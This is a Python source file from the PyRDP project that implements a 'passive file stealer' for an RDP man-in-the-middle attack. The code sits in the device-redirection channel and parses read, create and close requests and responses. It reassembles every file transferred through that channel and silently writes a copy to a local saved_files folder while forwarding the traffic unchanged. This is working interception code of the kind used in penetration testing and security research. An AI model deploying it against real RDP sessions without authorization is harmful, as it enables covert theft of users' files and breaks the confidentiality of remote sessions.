#
# This file is part of the PyRDP project.
# Copyright (C) 2018 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import logging
import os
from io import BytesIO
from logging import Logger
from typing import Dict

from pyrdp.core import decodeUTF16LE, getLoggerPassFilters, Observer
from pyrdp.enum import CreateOption, FileAccess, IOOperationSeverity, MajorFunction
from pyrdp.layer import Layer
from pyrdp.parser import DeviceRedirectionParser
from pyrdp.pdu import DeviceCloseRequestPDU, DeviceCreateRequestPDU, DeviceIORequestPDU, DeviceIOResponsePDU, \
    DeviceListAnnounceRequest, DeviceReadRequestPDU, DeviceRedirectionPDU
from pyrdp.pdu.rdp.virtual_channel.device_redirection import DeviceRedirectionServerCapabilitiesPDU, \
    DeviceRedirectionClientCapabilitiesPDU
from pyrdp.recording import Recorder


class PassiveFileStealer(Observer):
    """
    The passive file stealer parses specific packets in the RDPDR channel to intercept
    and reconstruct transferred files. They are then saved to {currentDir}/saved_files/{filePath}
    as soon as it's done being transferred.
    """

    def __init__(self, layer: Layer, recorder: Recorder, logger: logging.Logger, **kwargs):
        super().__init__(**kwargs)
        self.peer: PassiveFileStealer = None
        self.layer = layer
        self.recorder = recorder
        self.mitm_log = getLoggerPassFilters(f"{logger.name}.deviceRedirection")
        self.deviceRedirectionParser = DeviceRedirectionParser()
        self.completionIdInProgress: Dict[MajorFunction, DeviceIORequestPDU] = {}
        self.reconstructedFilesTemp: Dict[int, BytesIO] = {}
        self.openedFiles: Dict[int, bytes] = {}
        self.finalFiles: Dict[str, BytesIO] = {}
        self.pduToSend = None  # Needed since the PDU changes if it's a response.

    def onPDUReceived(self, pdu: DeviceRedirectionPDU):
        """
        Handles the PDU and transfer it to the other end of the MITM.
        """
        self.pduToSend = pdu
        if isinstance(pdu, DeviceIORequestPDU):
            self.handleIORequest(pdu)
        elif isinstance(pdu, DeviceIOResponsePDU):
            self.handleIOResponse(pdu)
        elif isinstance(pdu, DeviceListAnnounceRequest):
            self.handleDeviceListAnnounceRequest(pdu)
        elif isinstance(pdu, DeviceRedirectionServerCapabilitiesPDU):
            self.handleServerCapabilities(pdu)
        elif isinstance(pdu, DeviceRedirectionClientCapabilitiesPDU):
            self.handleClientCapabilities(pdu)
        else:
            self.mitm_log.debug(f"Received unparsed PDU: {pdu.packetId.name}")

        self.peer.sendPDU(self.pduToSend)

    def handleIORequest(self, pdu: DeviceIORequestPDU):
        """
        Sets the request in the list of requests in progress of the other end of the MITM.
        Also logs useful information.
        """
        self.peer.completionIdInProgress[pdu.completionId] = pdu
        if isinstance(pdu, DeviceReadRequestPDU):
            self.mitm_log.debug(f"ReadRequest received for file {self.peer.openedFiles[pdu.fileId]}")
        elif isinstance(pdu, DeviceCreateRequestPDU):
            if pdu.desiredAccess & (FileAccess.GENERIC_READ | FileAccess.FILE_READ_DATA):
                self.mitm_log.debug(f"Create request for read received for path {self.bytesToPath(pdu.path)}")
        else:
            self.mitm_log.debug(f"Unparsed request: {MajorFunction(pdu.majorFunction).name}")

    def handleIOResponse(self, pdu: DeviceIOResponsePDU):
        """
        Based on the type of request the response is meant for, handle open files, closed files and read data.
        Also remove the associated request from the list of requests in progress.
        """
        if pdu.completionId in self.completionIdInProgress.keys():
            requestPDU = self.completionIdInProgress[pdu.completionId]
            if pdu.ioStatus >> 30 == IOOperationSeverity.STATUS_SEVERITY_ERROR:
                self.mitm_log.warning("Received an IO Response with an error IO status: %(responsePdu)s " +
                                      "For request %(requestPdu)s", {"responsePdu": repr(pdu), "requestPdu": repr(requestPDU)})
            if isinstance(requestPDU, DeviceReadRequestPDU):
                self.mitm_log.debug(f"Read response received.")
                self.handleReadResponse(pdu, requestPDU)
            elif isinstance(requestPDU, DeviceCreateRequestPDU):
                self.handleCreateResponse(pdu, requestPDU)
            elif isinstance(requestPDU, DeviceCloseRequestPDU):
                self.handleCloseResponse(pdu, requestPDU)
            else:
                self.mitm_log.debug("Unknown response received: %(pdu)s", {"pdu": pdu})
            self.completionIdInProgress.pop(pdu.completionId)
        else:
            self.mitm_log.error("Completion id %(completionId)d not in the completionId in progress list. "
                                "This might mean that someone is sending corrupted data.", {"completionId": pdu.completionId})

    def handleDeviceListAnnounceRequest(self, pdu: DeviceListAnnounceRequest):
        for device in pdu.deviceList:
            self.mitm_log.info("%(deviceName)s mapped with ID %(deviceId)d: %(deviceData)s",
                               {"deviceName": device.deviceType.name, "deviceId": device.deviceId,
                                "deviceData": device.deviceData.decode(errors="backslashreplace")})

    def handleReadResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceReadRequestPDU):
        """
        Put data in a BytesIO for later saving.
        """
        readDataResponsePDU = self.deviceRedirectionParser.parseReadResponse(pdu)
        self.pduToSend = readDataResponsePDU
        fileName = self.bytesToPath(self.openedFiles[requestPDU.fileId])
        if fileName not in self.finalFiles.keys():
            self.finalFiles[fileName] = BytesIO()
        stream = self.finalFiles[fileName]
        stream.seek(requestPDU.offset)
        stream.write(readDataResponsePDU.readData)

    def handleCreateResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceCreateRequestPDU):
        """
        If its been created for reading, add the file to the list of opened files.
        """
        createResponse = self.deviceRedirectionParser.parseDeviceCreateResponse(pdu)
        self.pduToSend = createResponse
        if requestPDU.desiredAccess & (FileAccess.GENERIC_READ | FileAccess.FILE_READ_DATA) and \
           requestPDU.createOptions & CreateOption.FILE_NON_DIRECTORY_FILE != 0:
            self.mitm_log.debug("Opening file %(path)s as number %(number)d",
                               {"path": decodeUTF16LE(requestPDU.path), "number": createResponse.fileId})
            self.openedFiles[createResponse.fileId] = requestPDU.path

    def handleCloseResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceCloseRequestPDU):
        """
        Clean everything and write the file to disk.
        """
        if requestPDU.fileId in self.openedFiles.keys():
            self.mitm_log.debug("Closing file: %(fileId)s.", {"fileId": requestPDU.fileId})
            path = self.bytesToPath(self.openedFiles[requestPDU.fileId])
            if path in self.finalFiles:
                self.writeToDisk(path, self.finalFiles[path])
            self.openedFiles.pop(requestPDU.fileId)

    def handleServerCapabilities(self, pdu: DeviceRedirectionServerCapabilitiesPDU):
        self.mitm_log.debug("Received Server capabilities")

    def handleClientCapabilities(self, pdu: DeviceRedirectionClientCapabilitiesPDU):
        self.mitm_log.debug("Received Client capabilities")

    def sendPDU(self, pdu: DeviceRedirectionPDU):
        """
        Write and send the PDU to the upper layers
        """
        self.layer.sendPDU(pdu)

    def writeToDisk(self, path: str, stream: BytesIO):
        """
        Sanitize the path, make sure the folders exist and save the provided data on disk.
        """
        goodPath = "./saved_files/" + path.replace("\\", "/").replace("..", "")
        os.makedirs(os.path.dirname(goodPath), exist_ok=True)
        self.mitm_log.info("Writing %(path)s to disk.", {"path": goodPath})
        with open(goodPath, "wb") as file:
            file.write(stream.getvalue())

    def bytesToPath(self, pathAsBytes: bytes):
        """
        Converts a windows-encoded path to a beautiful, python-ready path.
        """
        return decodeUTF16LE(pathAsBytes).strip("\x00")


class PassiveFileStealerClient(PassiveFileStealer):

    def __init__(self, layer: Layer, recorder: Recorder, logger: Logger, **kwargs):
        super().__init__(layer, recorder, logger, **kwargs)


class PassiveFileStealerServer(PassiveFileStealer):

    def __init__(self, layer: Layer, recorder: Recorder, clientObserver: PassiveFileStealerClient, logger: Logger, **kwargs):
        super().__init__(layer, recorder, logger, **kwargs)
        self.clientObserver = clientObserver

    def sendPDU(self, pdu: DeviceRedirectionPDU):
        super(PassiveFileStealerServer, self).sendPDU(pdu)

